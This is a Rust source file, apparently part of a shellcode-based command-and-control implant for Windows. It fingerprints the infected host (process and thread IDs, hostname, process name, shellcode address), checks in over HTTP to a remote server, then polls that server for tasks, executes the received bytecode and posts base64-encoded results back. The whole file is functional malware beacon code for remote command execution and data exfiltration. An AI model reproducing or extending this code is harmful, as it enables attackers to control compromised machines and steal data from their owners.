//! C2 module for connect-back command execution
//!
//! This module provides outbound session functionality where the agent
//! connects to a remote host and executes commands received over the connection.
//! Supports HTTP (polling) mode.

use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::ffi::c_void;

use crate::{_start, execute_from_ptr, shellcode_end};
use crate::get_instance;
use crate::libs::utils::write_output;
use crate::libs::winhttp::HttpClient;

/// Convert 16 UUID bytes to string format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
fn uuid_to_string(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut s = String::with_capacity(36);
    for (i, &b) in bytes.iter().enumerate() {
        s.push(HEX[(b >> 4) as usize] as char);
        s.push(HEX[(b & 0xf) as usize] as char);
        if i == 3 || i == 5 || i == 7 || i == 9 {
            s.push('-');
        }
    }
    s
}


/// Execute bytecode and return the result
/// Expects full compiled bytecode format: [version:u8][size:u32][constants][jump_table][tasks]
/// Returns: [total_len:u32][len1:u32][status1:u32][data1...][len2:u32][status2:u32][data2...]...
fn execute_bytecode(task_id: u8, bytecode: &[u8]) -> Vec<u8> {
    if bytecode.len() < 5 {
        return b"bytecode too short".to_vec();
    }

    unsafe {
        // Enable results accumulation
        if let Some(inst) = get_instance() {
            inst.results_buffer = Some(Vec::new());
        }

        // Execute bytecode
        let data_ptr = bytecode.as_ptr().add(5);
        let _last_result = execute_from_ptr(data_ptr as *const c_void, task_id);

        // Take accumulated results and clear buffer
        let results = if let Some(inst) = get_instance() {
            inst.results_buffer.take().unwrap_or_default()
        } else {
            Vec::new()
        };

        // Return with total length prefix
        let mut output = Vec::with_capacity(4 + results.len());
        output.extend_from_slice(&(results.len() as u32).to_le_bytes());
        output.extend_from_slice(&results);
        output
    }
}

/// Convert u32 to hex string (no_std compatible)
pub fn u32_to_hex(value: u32) -> alloc::string::String {
    use alloc::string::String;
    if value == 0 {
        return String::from("0");
    }
    let mut result = String::new();
    let mut v = value;
    while v > 0 {
        let digit = (v & 0xF) as u8;
        let c = if digit < 10 { b'0' + digit } else { b'a' + digit - 10 };
        result.insert(0, c as char);
        v >>= 4;
    }
    result
}

/// Convert u32 to decimal string (no_std compatible)
pub fn u32_to_dec(value: u32) -> alloc::string::String {
    use alloc::string::String;
    if value == 0 {
        return String::from("0");
    }
    let mut result = String::new();
    let mut v = value;
    while v > 0 {
        let digit = (v % 10) as u8;
        result.insert(0, (b'0' + digit) as char);
        v /= 10;
    }
    result
}

/// Get the current process executable name (e.g. "svchost.exe")
/// Uses GetModuleFileNameA(NULL) to get full path, then extracts the filename.
pub unsafe fn get_process_name() -> String {
    use alloc::string::String;

    let inst = match get_instance() {
        Some(i) => i,
        None => return String::from("unknown"),
    };

    // Resolve GetModuleFileNameA from kernel32
    type GetModuleFileNameA = unsafe extern "system" fn(*mut c_void, *mut u8, u32) -> u32;
    let func_ptr = (inst.k32.get_proc_address)(
        inst.k32.module_base as *mut c_void,
        "GetModuleFileNameA\0".as_bytes().as_ptr(),
    );

    let get_module_file_name_a: GetModuleFileNameA = match func_ptr {
        Some(f) => core::mem::transmute(f),
        None => return String::from("unknown"),
    };

    let mut path_buf = [0u8; 260];
    let len = get_module_file_name_a(
        core::ptr::null_mut(),
        path_buf.as_mut_ptr(),
        path_buf.len() as u32,
    );

    if len == 0 {
        return String::from("unknown");
    }

    let path = match core::str::from_utf8(&path_buf[..len as usize]) {
        Ok(s) => s,
        Err(_) => return String::from("unknown"),
    };

    // Extract filename after last backslash
    match path.rfind('\\') {
        Some(pos) => String::from(&path[pos + 1..]),
        None => String::from(path),
    }
}

/// Get the current thread ID
pub fn get_tid() -> u32 {
    unsafe { (get_instance().unwrap().k32.get_current_thread_id)() }
}

/// Get the current process ID
pub fn get_pid() -> u32 {
    unsafe { (get_instance().unwrap().k32.get_current_process_id)() }
}

/// Get the hostname via GetComputerNameA
pub fn get_hostname() -> String {
    unsafe {
        let inst = match get_instance() {
            Some(i) => i,
            None => return String::from("unknown"),
        };
        let mut buf = [0u8; 256];
        let mut len = 256u32;
        (inst.k32.get_computer_name_a)(buf.as_mut_ptr(), &mut len);
        core::str::from_utf8(&buf[..len as usize])
            .unwrap_or("unknown")
            .into()
    }
}

/// Get shellcode base address as 16-char hex string
pub fn get_shellcode_addr_hex() -> [u8; 16] {
    crate::libs::utils::get_addr_hex(unsafe { _start as *const () as usize })
}

/// Get total size of shellcode + bytecode
pub fn get_shellcode_total_size() -> usize {
    crate::libs::utils::get_shellcode_size() + crate::libs::utils::get_bytecode_size()
}

/// Convert usize to decimal string (no_std compatible)
fn usize_to_dec(value: usize) -> String {
    if value == 0 {
        return String::from("0");
    }
    let mut result = String::new();
    let mut v = value;
    while v > 0 {
        let digit = (v % 10) as u8;
        result.insert(0, (b'0' + digit) as char);
        v /= 10;
    }
    result
}

/// Build the JSON body for checkin (hand-built, no serde in no_std)
pub fn build_checkin_json(sleep: u32, agent_id: Option<&str>) -> String {
    let pid = get_pid();
    let tid = get_tid();
    let hostname = get_hostname();
    let process_name = unsafe { get_process_name() };
    let addr_hex = get_shellcode_addr_hex();
    let total_size = get_shellcode_total_size();
    let inst = unsafe { get_instance().unwrap() };
    let magic = inst.magic;

    let mut j = String::from("{\"magic\":\"");
    j.push_str(&u32_to_hex(magic));
    j.push_str("\",\"pid\":");
    j.push_str(&u32_to_dec(pid));
    j.push_str(",\"tid\":");
    j.push_str(&u32_to_dec(tid));
    j.push_str(",\"hostname\":\"");
    j.push_str(&hostname);
    j.push_str("\",\"sleep\":");
    j.push_str(&u32_to_dec(sleep));
    j.push_str(",\"process_name\":\"");
    j.push_str(&process_name);
    j.push_str("\",\"shellcode_addr\":\"");
    // addr_hex is [u8; 16] of ASCII hex chars
    if let Ok(s) = core::str::from_utf8(&addr_hex) {
        j.push_str(s);
    }
    j.push_str("\",\"shellcode_size\":");
    j.push_str(&usize_to_dec(total_size));
    if let Some(aid) = agent_id {
        j.push_str(",\"agent_id\":\"");
        j.push_str(aid);
        j.push('"');
    }
    j.push('}');
    j
}

/// Run HTTP beacon - poll server for tasks and post results
/// 1. POST /checkin with JSON body - server returns GUID
/// 2. GET /tasks/<guid> - server returns [16-byte task_id][bytecode] (empty = no tasks)
/// 3. POST /results/<guid>/<task_id> - agent sends execution results
pub fn run_http_beacon(host: &str, port: u16, interval_ms: u32, secure: bool, agent_id: Option<&str>) -> Result<(), u32> {
    use alloc::string::String;

    unsafe {
        let inst = match get_instance() {
            Some(i) => i,
            None => return Err(0x80004005u32),
        };

        #[cfg(feature = "debug")]
        write_output(b"[http_beacon] starting\n");

        // Use existing GUID if available, otherwise check in
        let guid: String = if let Some(existing_guid) = &inst.c2_guid {
            #[cfg(feature = "debug")]
            write_output(b"[http_beacon] using existing guid\n");
            existing_guid.clone()
        } else {
            let json = build_checkin_json(interval_ms, agent_id);

            // Check-in loop - keep trying until we get a GUID
            let new_guid: String;
            loop {
                (inst.k32.sleep)(interval_ms);

                let mut client = match HttpClient::new() {
                    Ok(c) => c,
                    Err(_) => continue,
                };

                client.headers = Some(String::from("Content-Type: application/json\r\n"));
                let response = match client.send("POST", host, port, "/checkin", secure, Some(&json)) {
                    Ok(data) => data,
                    Err(_) => continue,
                };

                // Server should return GUID as response body
                if response.is_empty() {
                    continue;
                }

                // Got a GUID
                let lossy = String::from_utf8_lossy(&response);
                let trimmed = lossy.trim_end_matches('\0');
                let g = String::from(trimmed);
                if g.is_empty() {
                    continue;
                }

                new_guid = g;
                break;
            }

            // Store GUID in instance for use by Frida and other modules
            inst.c2_guid = Some(new_guid.clone());
            #[cfg(feature = "debug")]
            write_output(b"[http_beacon] checked in\n");
            new_guid
        };

        // Build tasks path with GUID
        let mut tasks_path = String::from("/tasks/");
        tasks_path.push_str(&guid);

        // Results path base (task_id appended per-task)
        let mut results_path_base = String::from("/results/");
        results_path_base.push_str(&guid);
        results_path_base.push('/');

        // Main polling loop
        loop {
            (inst.k32.sleep)(interval_ms);

            // GET /tasks/<guid> to check for work
            let client = match HttpClient::new() {
                Ok(c) => c,
                Err(_) => continue,
            };

            let tasks_response = match client.send("GET", host, port, &tasks_path, secure, None) {
                Ok(data) => data,
                Err(_) => continue,
            };

            // Empty response = no tasks
            if tasks_response.is_empty() {
                continue;
            }

            // Check for shutdown signal (single byte 0xFF)
            if tasks_response.len() == 1 && tasks_response[0] == 0xFF {
                #[cfg(feature = "debug")]
                write_output(b"[http_beacon] shutdown received\n");
                return Ok(());
            }

            // Response format: [16-byte task_id UUID][bytecode...]
            if tasks_response.len() < 16 {
                continue; // Invalid response
            }

            // Extract task_id (first 16 bytes) and bytecode (rest)
            let task_id_bytes = &tasks_response[..16];
            let bytecode = &tasks_response[16..];

            // Convert task_id bytes to UUID string
            let task_id = uuid_to_string(task_id_bytes);

            // Execute bytecode
            let result = execute_bytecode(0, bytecode);

            // Build results path: /results/<guid>/<task_id>
            let mut results_path = results_path_base.clone();
            results_path.push_str(&task_id);

            // POST results back
            let client = match HttpClient::new() {
                Ok(c) => c,
                Err(_) => continue,
            };

            // Base64 encode result for POST body
            let result_b64 = crate::libs::utils::encode_base64(&result);
            let _ = client.send("POST", host, port, &results_path, secure, Some(&result_b64));
        }
    }
}
